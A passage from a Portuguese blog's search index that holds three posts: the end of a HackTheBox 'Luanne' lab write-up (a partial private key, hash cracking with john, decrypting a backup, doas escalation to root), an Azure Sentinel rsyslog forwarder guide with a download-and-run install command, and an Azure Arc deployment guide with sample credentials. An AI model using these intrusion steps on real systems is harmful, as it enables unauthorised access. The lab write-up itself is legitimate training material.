189zIG0dHfVDVQBCXd2Rng15eN5WnsW2LL8iHL25T5K2yi+hsZHU6jJ0CNuB1X6ITuHhQg QLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp9 9OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b 45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG -----END OPENSSH PRIVATE KEY-----   Ao validar a chave RSA existente (id_rsa) notei que não se trata de uma chave RSA, mas uma chave OPENSSH. Para convertê-la precisei realizar os seguintes procedimentos:      Remover a quebra de linha ao final do arquivo, após a instrução -----END OPENSSH PRIVATE KEY-----.   Conversão de OpenSSH para RSA usando o comando abaixo, assim como a redefinição das permissões para que pudéssemos utilizá-la com o ssh, informando a senha da chave a ser exportada em branco.   chmod 600 id_rsa ssh-keygen -p -m PEM -f ./id_rsa Key has comment 'r.michaels@luanne.htb' Enter new passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved with the new passphrase.   Com esta chave, o acesso com a conta r.michaelsfoi possível, onde obtivemos o flag de usuário.   ssh -i id_rsa r.michaels@10.10.10.218 The authenticity of host '10.10.10.218 (10.10.10.218)' can't be established. ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts. Last login: Sat Feb 20 07:14:11 2021 from 10.10.14.33 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020    Welcome to NetBSD!    luanne$ id &amp;&amp; pwd &amp;&amp; ls -la uid=1000(r.michaels) gid=100(users) groups=100(users) /home/r.michaels total 52 dr-xr-x--- 7 r.michaels users 512 Sep 16 18:20 . drwxr-xr-x 3 root wheel 512 Sep 14 06:46 .. -rw-r--r-- 1 r.michaels users 1772 Feb 14 2020 .cshrc drwx------ 2 r.michaels users 512 Sep 14 17:16 .gnupg -rw-r--r-- 1 r.michaels users 431 Feb 14 2020 .login -rw-r--r-- 1 r.michaels users 265 Feb 14 2020 .logout -rw-r--r-- 1 r.michaels users 1498 Feb 14 2020 .profile -rw-r--r-- 1 r.michaels users 166 Feb 14 2020 .shrc dr-x------ 2 r.michaels users 512 Sep 16 16:51 .ssh dr-xr-xr-x 2 r.michaels users 512 Nov 24 09:26 backups dr-xr-x--- 4 r.michaels users 512 Sep 16 15:02 devel dr-x------ 2 r.michaels users 512 Sep 16 16:52 public_html -r-------- 1 r.michaels users 33 Sep 16 17:16 user.txt luanne$ cat user.txt &lt;redacted&gt;   Root flag   No home directory do usuário r.michaels encontrada uma pasta chamada backups, que contém um arquivo criptografado devel_backup-2020-09-16.tar.gz.enc. Para descriptografá-lo precisamos de uma senha ou chave deste usuário.   Executando o script linpeas.sh vi alguns insights interessantes que nos ajudariam a encontrar o caminho para o root:      Usuário r.michaels possui acessos doas de execução como root, equivalentes ao sudo em outras distribuições;   [+] Checking doas.conf permit r.michaels as root      Chave PGP para o app netpgp, que permite criptografar, descriptografar e assinar arquivos;     [+] Do I have PGP keys? gpg Not Found /usr/bin/netpgpkeys 1 key found \"pub\" 2048/\"RSA (Encrypt or Sign)\" \"op\" 2020-09-14 Key fingerprint: \"027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a \" uid \"RSA 2048-bit key &lt;r.michaels@localhost&gt;\" \"\"           Caminhos user writable:   [+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files /home/r.michaels /tmp /var/mail /var/mail/r.michaels /var/shm /var/spool/sockets   Uma vez que ja temos as informações acima, segui com a tentativa descriptografar o arquivo de backup utilizando a chave pgp encontrada. O ponto importante neste item é utilizar um caminho user writable, neste caso o /var/shm   luanne$ netpgp --decrypt --output=/var/shm/devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz.enc signature 2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a uid RSA 2048-bit key &lt;r.michaels@localhost&gt;   Analisando o conteúdo do arquivo compactado, vimos que temos os arquivos utilizados para a API e index.html, mas o que chamou a atenção foi o conteúdo do .htpasswd, que embora tivesse o mesmo user(webapi_user), apresentava uma senha diferente da já encontrada.   tree -a devel-2020-09-16 devel-2020-09-16 ├── webapi │ └── weather.lua └── www ├── .htpasswd └── index.html   Utilizando o mesmo método feito para o arquivo anterior, foi encontrada a senha littlebear.   john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long ./www/.htpasswd Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status littlebear (webapi_user) 1g 0:00:00:00 DONE (2021-02-20 16:02) 1.333g/s 17216p/s 17216c/s 17216C/s mirame..limewire Use the \"--show\" option to display all of the cracked passwords reliably Session completed   Assim como o sudo, o doas requer que uma senha seja informada, onde littlebear funcionou como esperado, permitindo a obtenção da flag de root:   doas /bin/sh Password: # hostname &amp;&amp; id luanne.htb uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm) # cat /root/root.txt &lt;redacted&gt;   Espero que tenham gostado!   Vejo vocês novamente em breve! :smiley:  ","categories": ["Writeup"],
        "tags": ["HackTheBox","htb-easy","htb-linux"],
        "url": "https://davicruz.com/writeup/2021/03/htb-luanne/",
        "teaser": "https://i.imgur.com/8bsXO5e.png"
      },{
        "title": "Azure Sentinel: Configuração do Log Forwarder",
        "excerpt":"Frequentemente apoio clientes no deployment de forwarders (encaminhadores) de logs CEF/Syslog em seus ambientes para coletar informações de appliances de rede e/ou servidores e serviços para o Log Analytics, que consequentemente os disponibiliza para o Azure Sentinel.   Embora tenhamos uma diversidade de documentações em como fazer este deployment, assim como recursos de comunidade como o Tech Community e Webinars, compilei todos os pontos que normalmente reviso com meus clientes nestes engajamentos de deployment e revisão neste post para ajudar àqueles que estejam enfrentando algum desafio em seu ambiente.     :newspaper: Edits:      30/04/2021 - Incluído seção Redução de mensagens repetidas     Requisitos   De acordo com a documentação oficial da Microsoft, os requisitos para este recurso são bastante simples, conforme listado abaixo:      4 CPUs e 8GB RAM, que é capaz de processar cerca de 8500 EPS (eventos por segundo) utilizando o rsyslog, de acordo com a documentação.            Se estiver realizado este deployment no Azure você pode utilizar o SKU Standard_F4s_v2 que é otimizado para processamento e recomendado neste caso.           Uma distribuição Linux em que o Microsoft Monitoring Agent (também conhecido como omsagent) seja suportado.   Python versão 2.7 ou 3.   Um dos serviços de syslog suportados instalado. Na maioria dos cenários que trabalhei utilizei o rsyslog, uma vez que normalmente é o pacote padrão na maioria das distribuições. Abaixo a lista das versões suportadas, também de acordo com a documentação:            Rsyslog v8       Syslog-ng 2.1 - 3.22.1           Arquitetura do Forwarder      A arquitetura da solução é bem simples:      É composta por uma ou mais máquinas recebendo os logs em protocolo syslog via UDP, TCP ou TLS. Isso é alcançado a partir da configuração de listeners no rsyslog ou no syslog-ng, assim como quaisquer servidores syslog você tenha ou teve em execução em seu ambiente.   As mensagens recebidas são encaminhadas para os listeners locais que são configurados no omsagent para ingestão como logs puros em Syslog (UDP/25224) ou CEF (TCP/25226).   Mensagens são encaminhadas ao Log Analytics workspace de acordo com a sua configuração, acessíveis também ao Sentinel a partir da ativação da solução.   Agora vou orientá-los quando aos detalhes da configuração desta infraestrutura e compartilhar algumas dicas de configurações mais detalhadas para mitigar alguns problemas e reduzir ingestão desnecessária no seu ambiente.   Considerações de Design   Antes de realizar o deploy/revisar a infraestrutura do seu forwarder, existem algumas perguntas que precisamos responder que auxiliarão na correta definição das suas configurações:      Este forwarder receberá apenas mensagens CEF, Syslog ou ambos?            Embora ambos os tipos de mensagens sejam recebidos via protocolo syslog, as mensagens CEF são formatadas de acordo com seu padrão pelo omsagent, disponibilizando cada campo em uma coluna própria no Log Analytics, enquanto as mensagens Syslog puro são armazenadas em uma única coluna, o que irá requerer esforço adicional quando necessário realizar a análise destes dados em alguma regra.       Também, se você estiver utilizando o forwarder para ambos os tipos de logs, precisará impedir que mensagens enviadas do tipo CEF sejam armazenadas também como Syslog, o que irá incorrer em custo duplicado para sua workspace.           Quais são os facilities e severidades, assim como tipos de mensagens e fontes que serão encaminhados ao Sentinel?            Envio de dados em excesso ao Sentinel pode gerar alto custo se não filtrados adequadamente.       Considere mapear os cenários de detecção de acordo com o MITRE ATT&amp;CK Matrix Techniques que tem interesse investigar antes de enviar os dados. Desta forma você conseguirá evitar o envio de dados sem um propósito ao seu SIEM, que não lhe trarão nenhum retorno sobre o investimento feito tanto em armazenamento quanto no Sentinel.           Quais são os requisitos de segurança para esta comunicação?            Como descrito no post sobre boas práticas compartilhado por Cristhofer Romeo Muñoz, devemos utilizar TCP como o protocolo padrão para qualquer comunicação devido a sua confiabilidade, a menos que seu appliance apenas suporte UDP ou se necessite de criptografia na comunicação, adotando TLS quando o dado for transmitido pela internet ou se houver dados sensíveis a serem coletados.       Instalando o forwarder próximo da fonte também ajuda a reduzir a complexidade dos protocolos utilizados, assim como evita que tenhamos problemas de performance causados por alta latencia na comunicação entre origem e forwarder.           Instalação   A instalação inicial pode ser facilmente realizada executando o script cef_installer.py, disponível no repositório oficial do Github utilizando a linha de comando abaixo, que pode ser obtida para seu ambiente acessando a página do conector Common Event Format (CEF) no Sentinel ou simplesmente substituir os dados &lt;workspace id&gt; e &lt;workspace secret&gt; pelos de sua workspace.   :bulb: Nota: Se não tiver o python 2.7 na máquina deverá substituir a instrução python por python3 antes de executar a linha abaixo.   sudo wget -O cef_installer.py https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/DataConnectors/CEF/cef_installer.py &amp;&amp; sudo python cef_installer.py &lt;workspace id&gt; &lt;workspace secret&gt;   Se seu forwarder necessita de um proxy para comunicar-se com a Internet, você precisará também atualizar tais configurações modificando o arquivo /etc/opt/microsoft/omsagent/proxy.conf:   proxyconf=\"http://user:password@proxyserver:3128\" #user:password can be ignored if you proxy doesn't require authentication sudo echo $proxyconf &gt;&gt;/etc/opt/microsoft/omsagent/proxy.conf sudo chown omsagent:omiusers /etc/opt/microsoft/omsagent/proxy.conf  #restart service sudo /opt/microsoft/omsagent/bin/service_control restart   Este script de instalação realiza as alterações listadas abaixo em seu sistema. A maioria delas necessita de conectividade com o Github uma vez que os assets utilizados estão armazenados no repositório oficial do Azure Sentinel:      Download e instalação do Microsoft Monitoring Agent para Linux.   Configuração do omsagent para ouvir na porta TCP/25226 e realizar o parsing das mensagens CEF a partir da cópia do arquivo security_events.conf dentro do diretório de configuração da workspace (/etc/opt/microsoft/omsagent/&lt;workspaceID&gt;/conf/omsagent.d).   Encaminha as mensagens que contenham ASA ou CEF para a porta TCP/25226 a partir da cópia do arquivo security-config-omsagent.conf para /etc/rsyslog.d/ ou /etc/syslog-ng/conf.d/, dependendo do seu serviço de syslog.   Habilita o serviço syslog para ouvir porta TCP/514 e UDP/514 a partir de edição do arquivo em /etc/rsyslog.conf ou /etc/syslog-ng/syslog-ng.conf.   Com esta configuração você já estará preparado para encaminhar as mensagens CEF para este servidor, que em breve estarão disponíveis na sua workspace de Log Analytics na tabela CommonSecurityLog, mas existem algumas outras alterações aqui descritas das quais poderá se beneficiar para coletar logs Syslog puro, assim como implementar filtros e ajustes na infraestrutura.   Configuração   Como vimos a infraestrutura é baseada no serviço de syslog + omsagent. Uma vez que o rsyslog é um dos mais populares serviços utilizados e já disponível por padrão da maioria das distribuições atualmente, utilizarei todas as configurações aqui descritas para este serviço, embora você possa também ajustá-las para funcionamento com o syslog-ng caso necessário.   Validação da versão e instalação do rsyslog   Como mencionado em documentação, precisamos utilizar o rsyslog versão 8. Para confirmar a versão em execução em seu systema você pode executar o comando rsyslogd -v, que exibirá um output como o exemplo abaixo:   $ rsyslogd -v rsyslogd 8.32.0, compiled with:         PLATFORM:                               x86_64-pc-linux-gnu         PLATFORM (lsb_release -d):         FEATURE_REGEXP:                         Yes         GSSAPI Kerberos 5 support:              Yes         FEATURE_DEBUG (debug build, slow code): No         32bit Atomic operations supported:      Yes         64bit Atomic operations supported:      Yes         memory allocator:                       system default         Runtime Instrumentation (slow code):    No         uuid support:                           Yes         systemd support:                        Yes         Number of Bits in RainerScript integers: 64   De acordo com a documentação do projeto, você não deve ter maiores problemas executando a versão do rsyslog disponível no repositório do mantenedor da distribuição a menos que eles não tenham portado alguma correção para ela. Neste caso você deverá baixar a última build para sua distribuição da página do projeto ou instalar a partir do código fonte.   Aplicando as configurações do rsyslog   Após quaisquer alterações feitas no arquivo de configuração do rsyslog (/etc/rsyslog.conf) ou qualquer outro arquivo por ele importado (normalmente em /etc/rsyslog.d/*.conf) você precisará reiniciar o serviço para que as alterações tenham efeito. Isso pode ser alcançado a partir da execução da linha de comando abaixo:   sudo systemctl restart rsyslog.service   Ajustando os listeners do rsyslog   Embora o cef_installer.py já defina os listeners para TCP/514 e UDP/514, talvez haja a necessidade de validar ou ajustar a sua configuração para criptografar a comunicação via TLS.   Sua configuração atual deve se parecer com o trecho abaixo, que pode ser visto no arquivo /etc/rsyslog.conf:   module(load=\"imuxsock\") # provides support for local system logging #module(load=\"immark\")  # provides --MARK-- message capability  # provides UDP syslog reception module(load=\"imudp\") input(type=\"imudp\" port=\"514\")   # provides TCP syslog reception module(load=\"imtcp\") input(type=\"imtcp\" port=\"514\")   A configuração para comunicação via TLS requer alguns itens adicionais, onde é necessário emitir os certificados para servidores e clientes (caso não esteja utilizando uma infra de PKI) assim como alterar o arquivo de configuração do rsyslog para aceitar estas comunicações.   Maiores detalhes e exemplos de configurações podem ser encontrados na documentação oficial neste link, de onde retirei o trecho abaixo para que tenham uma ideia de como esta configuração se parece:   module(load=\"imuxsock\") # local messages module(load=\"imtcp\" # TCP listener     StreamDriver.Name=\"gtls\"     StreamDriver.Mode=\"1\" # run driver in TLS-only mode     StreamDriver.Authmode=\"anon\"     )  # make gtls driver the default and set certificate files global(     DefaultNetstreamDriver=\"gtls\"     DefaultNetstreamDriverCAFile=\"/path/to/contrib/gnutls/ca.pem\"     DefaultNetstreamDriverCertFile=\"/path/to/contrib/gnutls/cert.pem\"     DefaultNetstreamDriverKeyFile=\"/path/to/contrib/gnutls/key.pem\"     )      # start up listener at port 6514     input(     type=\"imtcp\"     port=\"6514\"     )   Evitando registro de eventos remotos em arquivos locais   Um ponto que é sempre questionado pelos clientes é que após configurar máquinas como forwarder para CEF e/ou Syslog os arquivos de log locais (frequentemente /var/log/messages ou /var/log/syslog) são sobrecarregados com mensagens oriundas de servidores remotos, e na maioria das vezes consumindo todo o espaço em disco disponível do volume onde /var/log reside.   Isso ocorre porque as definições padrão do rsyslog, listadas abaixo, enviam alguns facilities e severidades para arquivos locais sem validar a fonte destes eventos (comentários e linhas em branco removidas por simplicidade).   :bulb: Nota: O caminho onde encontrar estas configurações padrão variam de acordo com a distribuição Linux. Para Ubuntu existe um arquivo chamado /etc/rsyslog.d/50-default.conf enquanto para distribuições baseadas em RHEL (RHEL, CentOS, Fedora) está na configuração principal do /etc/rsyslog.conf.   #Extracted from Ubuntu /etc/rsyslog.d/50-default.conf  auth,authpriv.*                 /var/log/auth.log *.*;auth,authpriv.none          -/var/log/syslog kern.*                          -/var/log/kern.log mail.*                          -/var/log/mail.log mail.err                        /var/log/mail.err *.emerg                         :omusrmsg:*   Como podem ver, qualquer mensagem que coincida com alguma severidade contida nesta lista é enviada para um dos arquivos locais. Uma forma rápida de prevenir este comportamento é editar o arquivo de configuração para apenas aceitar mensagens geradas pelo host local (127.0.0.1):   if ($fromhost-ip == '127.0.0.1') then {     auth,authpriv.*                 /var/log/auth.log     *.*;auth,authpriv.none          -/var/log/syslog     kern.*                          -/var/log/kern.log     mail.*                          -/var/log/mail.log     mail.err                        /var/log/mail.err     *.emerg                         :omusrmsg:* }   Redução de mensagens repetidas   Conforme lembrado pelo meu colega Flavio Honda, o Rsyslog possui uma opção que pode auxiliar com a redução de mensagens repetidas.   Se você sofre com este tipo de problema ou quer prevenir antes mesmo que venha acontecer em seu ambiente, você pode habilitar a configuração abaixo no seu arquivo /etc/rsyslog.conf :smile:.   $RepeatedMsgReduction on   A referência oficial sobre esta feature na documentação do RSyslog pode ser encontrada neste link.   Fluxo de processamento de mensagens   No rsyslog, o primeiro arquivo a ser processado é o rsyslog.conf, que normalmente contém uma instrução para importar todos os arquivos *.conf localizados no diretório /etc/rsyslog.d e os arquivos são processados em ordem alfabética. Quando uma mensagem chega ou é gerada no sistema, é encaminhada e avaliada por cada uma das configurações nesta mesma ordem, a menos que alteremos explicitamente este comportamento.   Na configuração abaixo, vamos considerar que estamos encaminhando mensagens no formato CEF de um appliance que são enviadas com o facility local4.info:         Se nenhuma alteração for realizada no rsyslog.conf ou 50-default.conf para prevenir o registro de mensagens de um host remoto, estas mensagens serão registradas no arquivo /var/log/syslog.   Também, se houver algum match no arquivo 95-omsagent.conf esta mensagem será enviada para a workspace de Log Analytics como Syslog puro.   E por fim, ele coincidirá com as regular expressions contidas no arquivo security-config-omsagent.conf e tratado como mensagem CEF para a tabela CommonSecurityLog.   Isso não apenas resultará no disco cheio, mas também em cobrança duplicada para este mesmo evento, que será armazenado duas vezes no Log Analytics.   Para evitar este comportamento, como Ofer Shezaf compartilhou em um dos Webinars da Comunidade de Segurança (Log Forwarder deep dive | Filtering CEF and Syslog events), vamos renomear o arquivo security-config-omsagent.conf para 60-cef.conf de forma que ele seja processado antes do 95-omsagent.conf.   Adicionalmente, precisamos garantir que uma vez que as mensagens sejam encaminhadas para o TCP/25226 e tratadas como CEF sejam descartadas, o que é alcançado pelo uso da instrução stop. O Stop remove as mensagens do processamento do rsyslog.   :bulb: Nota: Você poderá encontrar outras instruções que utilizem o stop como um til (~). Esta notação veio da syntax legado do syslogd   Esta configuração ficaria da seguinte forma:   $ cat /etc/rsyslog.d/60-cef.conf if ($rawmsg contains \"CEF:\") or ($rawmsg contains \"ASA-\") then {         *.*     @@127.0.0.1:25226         stop }      Ajustando o 95-omsagent.conf   Após a instalação inicial, o agente do MMA criará um arquivo de configuração no diretório do serviço syslog (/etc/rsyslog.d/95-omsagent.conf) em sincronismo com as configurações definidas no portal do Azure, navegando em sua workspace de Log Analytics &gt; Agents Configuration &gt; Syslog:      Para a configuração acima o seguinte conteúdo será criado no arquivo, conforme abaixo:   # OMS Syslog collection for workspace &lt;workspace id&gt; auth.=alert;auth.=crit;auth.=debug;auth.=emerg;auth.=err;auth.=info;auth.=notice;auth.=warning  @127.0.0.1:25224 authpriv.=alert;authpriv.=crit;authpriv.=debug;authpriv.=emerg;authpriv.=err;authpriv.=info;authpriv.=notice;authpriv.=warning  @127.0.0.1:25224 local3.=alert;local3.=crit;local3.=debug;local3.=emerg;local3.=err;local3.=info;local3.=notice;local3.=warning  @127.0.0.1:25224 local4.=alert;local4.=crit;local4.=debug;local4.=emerg;local4.=err;local4.=info;local4.=notice;local4.=warning  @127.0.0.1:25224   Mesmo que esta configuração seja extremamente simples de se fazer pelo portal, ela se aplica globalmente a todos os dispositivos Linux que possuem o omsagent conectado a esta workspace, ingerindo mais informação de que precisa dentro de sua workspace de Log Analytics se mais tipos de dados são selecionados que o necessário.   Se precisa definir uma configuração diferente para algumas máquinas como os seus forwarders, é recomendado que se edite diretamente o arquivo 95-omsagent.conf adicionando ou removendo facilities e severidades dele, assim como construindo suas condições para que estes dados sejam enviados ao Azure mas precisamos impedir que este arquivo seja sincronizado com as definições no portal.   O comando abaixo “quebra” o vínculo existente entre este arquivo e a configuração da workspace:   sudo su omsagent -c 'python /opt/microsoft/omsconfig/Scripts/OMS_MetaConfigHelper.py --disable'   A única coisa que não pode ser alterada no arquivo 95-omsagent.conf é a instrução de encaminhamento para @127.0.0.1:25224.   :bulb: Nota: Na sintaxe do syslogd uma arroba (@) significa UDP enquanto duas arrobas (@@) significam TCP.   :warning: Atenção: No webinar citado anteriormente sobre um Dep Dive a respeito de CEF forwarder, Ofer também recomendou alterar as configurações do omsagent para aceitar as comunicações também via TCP para Syslog. Se seguir esta recomendação você deverá também ajustar qualquer instrução de encaminhamento para dois arrobas no arquivo 95-omsagent.conf, caso contrário suas mensagens poderão não ser enviadas ao Log Analytics.   Filtrando eventos   Se você ainda estiver notando a ingestão de eventos desnecessários em sua workspace, você pode implementar um filtro na fonte assim como no encaminhador, o que normalmente é mais simples já que muitos appliances não suportam grande granularidade em suas configurações.   Uma forma fácil de configurar esta filtragem é criando um arquivo a ser processando antes do 60-cef.conf e 95-omsagent.conf, neste exemplo chamado de 59-filter-out.conf, mas poderia utilizar qualquer nome que desejar, desde seja processado na ordem correta.      Neste arquivo vamos utilizar novamente a instrução stop, removendo as mensagens que não gostaríamos que fossem encaminhadas seja como Syslog ou CEF. Neste exemplo qualquer mensagem que contenha a palavra “test” e tenha algum dos facilities/severidades mencionados serão removidas.   if ($rawmsg contains \"test\") and prifilt(\"auth,authpriv.*\") then {         stop }   A documentação do rsyslog é muito rica em recursos mostrando como você pode filtrar estas mensagens, assim como quais propriedades se encontram disponíveis para que possa configurar estas instruções de forma mais avançada, incluindo dicas de conversão das instruções que utilizam sintaxe syslogd para o advanced, também conhecido como RainerScript.   Espero que este conteúdo tenha sido útil para aqueles que estão realizando o seu deployment ou manutenção de CEF/Syslog forwarders no seu ambiente!   Você tem alguma configuração específica ou desafio não discutido aqui? Sinta-se à vontade para compartilhar nos comentários para que possamos complementar o post com mais detalhes, podendo assim auxiliar outros que estejam enfrentando o mesmo! :smile:  ","categories": ["Azure Sentinel"],
        "tags": ["Sentinel","Syslog","Rsyslog","Linux","Forwarder","Collector","CEF"],
        "url": "https://davicruz.com/azure-sentinel/2021/03/rsyslog-sentinel-log-forwarder/",
        "teaser": "https://davicruz.com/assets/images/teaser.png"
      },{
        "title": "Azure Arc enabled Servers: Instalação e Atualização via Configuration Manager",
        "excerpt":"Neste post compartilho o procedimento de como realizar o deploy e atualização do Azure Arc for Servers (Windows) via Microsoft Endpoint Manager Configuration Manager - MECM (aka SCCM).   O processo é bastante simples, porém algumas pequenas dicas são compartilhadas para que possa obter o máximo do ConfigMgr para esta atividade :smile:.   :information_source: Nota: Os scripts compartilhados neste post também poderão ser utilizado a partir de outras ferramentas de gestão de configuração, porém ajustes podem ser necessários para que funcionem adequadamente de acordo com o método utilizado.   Azure Arc enabled Servers   O Azure Arc permite o gerenciamento de servidores físicos e virtuais fora do Azure a partir da console do Azure, permitindo que gerencie extensões, atualizações e guest policies de forma consistente do mesmo modo em que máquinas virtuais nativas do Azure são gerenciadas.   O Azure Arc é um asset bastante importante para utilização de features como o Vulnerability Assessment do Azure Defender, assim como a manutenção de algumas extensões como Microsoft Monitoring Agent (MMA) e o novo Azure Monitor Agent (AMA).   Preço   De acordo com a página Azure Arc – Azure Management | Microsoft Azure, features relacionadas ao control plane do Azure (Instalação de Extensões, Arm Templates, etc.) são gratuitos, assim como o uso do Azure Update Management.   Features relacionadas à Azure Policy Guest Configurations (Automações, inventários, state configuration) e outros serviços conectados via Arc (Azure Defender e Azure Monitor, por exemplo) são cobrados de acordo com suas respectivas tabelas de custos, as quais poderão ser verificadas diretamente na calculadora do Azure.   Pré-requisitos   Alguns requisitos devem ser observados para viabilizar esta instalação, cujos detalhes podem ser observados no link Overview of the Connected Machine agent - Azure Arc | Microsoft Docs:      Um Sistema Operacional Suportado.   Liberação das URLs necessárias para o Serviço do Azure Arc, vide link acima citado.            Dependendo de como seu ambiente está configurado, o uso de um servidor proxy pode ser necessário.       Algumas extensões a serem instaladas via Arc podem necessitar de liberações adicionais para garantir seu funcionamento.           Provisionamento de um Service Principal para que o onboarding do Arc seja feito de modo silencioso. O procedimento de criação deste objeto está disponível detalhado em Connect hybrid machines to Azure at scale - Azure Arc | Microsoft Docs.   Ativação dos resource providers Microsoft.HybridCompute e Microsoft.GuestConfiguration, conforme discutido em Connect hybrid machine with Azure Arc enabled servers - Azure Arc | Microsoft Docs.   Gestão via Configuration Configuration Manager   Caso sua organização já faça uso do Configuration Manager para gestão de dispositivos, o mesmo também poderá ser utilizado para instalação e atualização do Azure Machine Connected Agent, utilizado pelo Azure Arc.   Instalação do Agente   Utilizando o recurso de Applications do Configuration Manager, temos a possibilidade de garantir que estes agentes estão instalados adequadamente em um dispositivo, o que permite uma melhor gestão do status de instalação do pacote após sua execução.   Abaixo descrevo o procedimento utilizado para criar este recurso:           Download da última release do instalador do Arc para Windows: O binário de instalação pode ser baixado diretamente da URL encurtada https://aka.ms/AzureConnectedMachineAgent. A linha de PowerShell abaixo salva o arquivo em um diretório especificado.              O arquivo deverá ser copiado para um diretório a ser utilizado pelo MECM como content source           $destinationPath = \"c:\\path\\to\\file\" Invoke-WebRequest -Uri https://aka.ms/AzureConnectedMachineAgent -OutFile \"$destinationPath\\AzureConnectedMachineAgent.msi\"                Baixar e editar o script Install-AzureArcMECM.ps1 e editar as variáveis conforme exemplo abaixo. Este script deverá ser colocado no mesmo caminho onde o arquivo *.msi baixado anteriormente está localizado.              Caso seu servidor necessite de um proxy para comunicação. especifique a variável $proxyUrl. Caso contrário, mantenha o valor em branco.       O script compartilhado, além de instalar o agente, realiza a configuração de proxy (se informado) e conecta o dispositivo ao serviço do Arc, conforme credenciais compartilhadas:           ## Variables $installLogFile = \"c:\\Windows\\Temp\\AzureArcSetup.log\"    $tenantID = \"7482a3c1-7102-4a0d-9dfb-0aa2186ce450\" $subscriptionID = \"48a0ab65-bd82-4aac-9283-99344f387d9b\" $ResourceGroupName = \"rg-azurearc-windows\" $serviceprincipalAppID = \"909e06f7-577c-45b9-b49e-eff9e6560ef6\" $serviceprincipalSecret = \"f53f0a59-6db3-4ac7-b861-e760d29240d8\" $resourceLocation = \"eastus\" $proxyUrl = \"\" # Format: http[s]://server.fqdn:port    ### Sample data provided for illustration purposes                Seguir com a criação do application no console do MECM acessando Software Library &gt; Application Management &gt; Applications e selecionar a opção Create Application no ribbon ou no menu de contexto de Application.             Selecione o arquivo caminho do *.msi no File Share onde foi armazenado, de acordo com o pré-estabelecido em seu ambiente.         Clique em Next para avançar após validar os dados do aplicativo a ser instalado.              Em General Information, substitua a linha de comando pré-configurada com a linha de comando abaixo para que a instalação ocorra a partir do script PowerShell baixado e clique em Next.       %windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File .\\Install-AzureArcMECM.ps1           :bulb: Dica: Complemente nesta janela também as informações solicitadas para enriquecer os dados de catálogo para este aplicativo e simplificar sua gestão posterior.             Revise as informações configuradas e clique em Next para criar o application.         Após concluída a criação, a seguinte mensagem de sucesso será exibida. Clique em Close para fechá-la.      Após criar o application, precisaremos ajudar alguns outros detalhes para que funcione de forma mais adequada, conforme abaixo:      Acesse as propriedades do deployment type selecionando o aplicativo &gt; clique na aba Deployment Types &gt; clique com o botão direito no deployment existente e selecione a opção Properties.         Na aba Detection Method, selecione a opção Use a custom script to detect the presence of this deployment type e clique no botão Edit.              Selecione a opção Powershell e cole o snippet abaixo, clicando em OK para concluir.              Este script de detecção verificará não apenas se o agente está devidamente instalado, mas se também estará conectado ao Azure Arc ao término do processo de instalação.              :warning: Alerta: É importante que o script apenas retorne algum output se o aplicativo estiver instalado. Qualquer output retornado o ConfigMgr interpreta como instalado.   # Detection Method: Returns the installed version if properly installed  try{     $agentDetails = &amp; \"$env:ProgramW6432\\AzureConnectedMachineAgent\\azcmagent.exe\" show     $agentStatus = ($agentDetails | Where-Object {$_ -like '*Agent Status*'}).Split(\": \")[-1]      if($agentStatus -eq 'Connected' ){     \tWrite-Output ($agentDetails | Where-Object {$_ -like '*Agent Version*'}).Split(\": \")[-1]     } } catch{ \t# Returns nothing if not installed }       Na aba Requirements é importante também configurarmos as versões de Sistema Operacional que desejamos que este pacote seja instalado. Isso também evita que deployments acidentais venham instalar o produto em desktops Windows, o que não é suportado.         Após ajustes, clicar em OK para finalizar a configuração.   Neste momento o application criado estará pronto para ser instalado nos servidores, onde poderá ser feito o deployment para uma collection, vide referência oficial.   Atualização do agente   De acordo com a documentação, o Azure Arc pode ser atualizado de forma Manual ou via WSUS para Sistemas Operacionais Windows.   Neste caso temos duas opções a serem seguidas:           Criar outro application no Configuration Manager para a nova versão:              Este mecanismo requer maior esforço administrativo por parte do ConfigMgr porém pode ser alcançado criando outro Application para a nova versão, conforme orientado neste post.                    Se desejar seguir com este método, a detecção deverá ser melhorada para levar em consideração a versão do Azure Arc instalado.                       É importante que seja definido para este novo aplicativo uma relação de substituição, conforme pode ser visto em mais detalhes neste link. Isso permite que novas instalações que referenciam o item anterior façam uso da versão mais recente, além de permitir a definição do comportamento a ser seguido para as máquinas que já possuem o produto instalado, que pode ser atualizar ou desinstalar.                Incluir os produtos e serviços no Catálogo de Software Update Point e processo de gestão de atualizações de sua organização (recomendado): Esta abordagem permite o uso do processo já implementado de gestão de atualizações via ConfigMgr para também atualizar o Azure Arc.                       Os seguintes produtos e classificações devem estar selecionados para sincronismo do Software Update Point na infraestrutura. Os detalhes de como realizar esta ação estão disponíveis neste link neste link:                                                  Configuração               Valor a ser selecionado                                                               Produtos               Microsoft &gt; Azure Connected Machine Agent                                         Classificação               Critical Updates                                                   Conclusão   Como pudemos ver o processo de instalação via Configuration Manager é bem simples, tendo apenas alguns ajustes para que possamos não apenas instalar o agente, mas também realizar o seu onboarding.   Na documentação oficial temos outros métodos de deployment disponíveis, que podem ser conferidos diretamente em seus respectivos artigos oficiais:      Install Connected Machine agent using Windows 